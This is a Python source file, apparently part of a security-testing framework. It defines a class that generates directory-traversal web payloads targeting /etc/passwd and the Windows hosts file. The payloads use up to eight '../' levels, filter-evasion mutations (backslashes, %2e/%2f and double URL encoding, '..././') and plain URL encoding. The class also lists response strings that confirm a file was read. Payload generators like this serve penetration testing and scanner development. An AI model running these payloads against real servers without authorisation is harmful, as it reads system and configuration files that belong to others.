import random, string
import urllib.parse
from pluck.module import GenerationModule



class DirectoryTraversalPayloadGenerator(GenerationModule):
    def __init__(self):
        super().__init__()

        self.os_files = ["/etc/passwd","C:\\Windows\\System32\\drivers\\etc\\hosts"]
        self.os_paths = ["C:\\Windows\\System32\\drivers\\etc", "etc", "Windows\\System32\\drivers\\etc"]
        self.depth = 8
        self.traversal = []

        self.success_strings = [
            'This is a sample HOSTS file used by Microsoft',
            'Copyright (c) 1993-2009 Microsoft Corp.',
            'root:x:0:0:root:/root',
        ]
        
    # generate dot dot shashes
    def generate_traversal(self):
        traversal = ""
        depth = int(self.depth)
        for i in range(1,depth+1):
            traversal += '../'
            self.traversal.append(traversal)


    def generate_payloads(self):
        # Generate traversal strings
        self.generate_traversal()

        result = []

        files = self.sanitize_double_slash(self.generate_traversal_files())
        paths = self.sanitize_double_slash(self.generate_traversal_paths())

        result.extend(files)
        result.extend(paths)

        mutate_files = self.generate_mutate(files)
        mutate_paths = self.generate_mutate(paths)

        result.extend(mutate_files)
        result.extend(mutate_paths)

        url_encoded = self.url_encode(result)

        result.extend(url_encoded)
        return list(set(result))

    def generate_traversal_files(self):
        result = []
        for t in self.traversal:
            for f in self.os_files:
                result.append(f"{t}{f}")
        return result

    def generate_traversal_paths(self):
        result = []
        for t in self.traversal:
            for f in self.os_paths:
                result.append(f"{t}{f}")
        return result

    def sanitize_double_slash(self,traversal):
        result = []
        for t in traversal:
            r = t.replace('//','/')
            result.append(r)
        return result

    def generate_mutate(self, lista):
        result = []

        for a in lista:
            r = a.replace('/','\\')
            result.append(r)

            r = a.replace('/','../')
            result.append(r)

            r = a.replace('/','..\\/')
            result.append(r)

            r = a.replace('.','%2e')
            result.append(r)

            r = a.replace('/','%2f')
            result.append(r)
   
            r = a.replace('.','%2e').replace('/','%2f')
            result.append(r)

            r = a.replace('.','%252e').replace('/','%252f')
            result.append(r)

            r = a.replace('../','..././')
            result.append(r)

            r = a.replace('..\\',"...\\.\\")
            result.append(r)

        return result

    def url_encode(self, lista):
        return [urllib.parse.quote(p) for p in lista]

